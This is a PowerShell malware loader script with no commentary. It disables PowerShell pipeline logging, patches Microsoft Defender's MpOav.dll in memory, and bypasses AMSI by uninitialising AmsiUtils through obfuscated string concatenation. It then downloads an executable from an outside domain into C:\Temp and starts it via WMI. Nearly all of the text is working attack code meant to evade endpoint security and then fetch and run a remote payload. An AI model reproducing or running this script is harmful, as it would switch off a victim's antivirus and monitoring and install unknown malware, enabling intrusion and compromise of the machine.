[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$User = $env:UserName
$Domain = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)

# Set the URL for the file to download
$url = "https://ky.reyes-holdings.uk/test.exe"

# Set the path to save the downloaded file
$filePath = "C:\Temp\testing.exe"

# Create a new WebClient object
$client = New-Object System.Net.WebClient

# Download the file and save it to the specified path
$client.DownloadFile($url, $filePath)

# Create a new WMI process object
$process = ([WMICLASS]"\\.\ROOT\CIMV2:Win32_Process").Create("C:\Temp\testing.exe")

# Start the process and wait for it to finish
$processStatus = $process.ReturnValue
if ($processStatus -eq 0) {
    Write-Output "Process started successfully"
} else {
    Write-Output "Error starting process. Return value: $processStatus"
}